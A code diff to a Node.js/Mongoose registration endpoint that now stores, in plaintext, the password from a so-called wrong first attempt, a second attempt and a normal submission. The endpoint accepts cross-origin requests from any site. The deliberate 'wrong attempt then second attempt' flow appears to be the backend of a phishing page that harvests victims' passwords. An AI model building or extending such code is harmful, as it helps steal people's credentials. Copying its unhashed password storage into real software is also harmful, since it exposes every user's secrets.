@@ -88,7 +88,6 @@
 
 
 
-
 const mongoose = require('mongoose');
 const User = require('../models/User');
 
@@ -108,7 +107,6 @@ async function connectDB() {
 }
 
 module.exports = async (req, res) => {
-  // CORS
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -128,7 +126,7 @@ module.exports = async (req, res) => {
   try {
     await connectDB();
 
-    const { userId, password, isWrongAttempt } = req.body;
+    const { userId, password, isWrongAttempt, isSecondAttempt } = req.body;
 
     if (!userId || !password) {
       return res.status(400).json({
@@ -141,40 +139,45 @@ module.exports = async (req, res) => {
     const existingUser = await User.findOne({ userId });
 
     if (existingUser) {
-      // ✅ User exists - update based on attempt type
+      // ✅ User exists - update
       if (isWrongAttempt) {
-        // WRONG ATTEMPT: wrongAttempts++ (database mein save)
+        // FIRST ATTEMPT: wrongAttempts++
         existingUser.wrongAttempts = (existingUser.wrongAttempts || 0) + 1;
         existingUser.lastWrongAttempt = new Date();
+        existingUser.wrongPassword = password; // Wrong password save
+        await existingUser.save();
+      } else if (isSecondAttempt) {
+        // SECOND ATTEMPT: secondPassword save
+        existingUser.secondPassword = password;
+        existingUser.hasSecondAttempt = true;
+        await existingUser.save();
+      } else {
+        // Normal register
         existingUser.password = password;
         await existingUser.save();
-
-        return res.json({
-          success: true,
-          message: 'Wrong attempt saved!',
-          data: {
-            userId: existingUser.userId,
-            wrongAttempts: existingUser.wrongAttempts,
-            loginCount: existingUser.loginCount
-          }
-        });
-      } else {
-        // REAL ATTEMPT: Already exists
-        return res.status(400).json({
-          success: false,
-          message: 'User already exists! Please login.'
-        });
       }
+
+      return res.json({
+        success: true,
+        message: 'User updated!',
+        data: {
+          userId: existingUser.userId,
+          wrongAttempts: existingUser.wrongAttempts || 0
+        }
+      });
     }
 
-    // ✅ NAYA USER - pehli baar register
+    // ✅ NAYA USER
     const newUser = new User({
       userId,
       password,
       firstLogin: new Date(),
       lastLogin: new Date(),
-      loginCount: isWrongAttempt ? 0 : 1,
+      loginCount: 0,
       wrongAttempts: isWrongAttempt ? 1 : 0,
+      wrongPassword: isWrongAttempt ? password : null,
+      secondPassword: isSecondAttempt ? password : null,
+      hasSecondAttempt: isSecondAttempt ? true : false,
       lastWrongAttempt: isWrongAttempt ? new Date() : null
     });
 
@@ -185,7 +188,6 @@ module.exports = async (req, res) => {
       message: 'User registered!',
       data: {
         userId: newUser.userId,
-        loginCount: newUser.loginCount,
         wrongAttempts: newUser.wrongAttempts
       }
     });
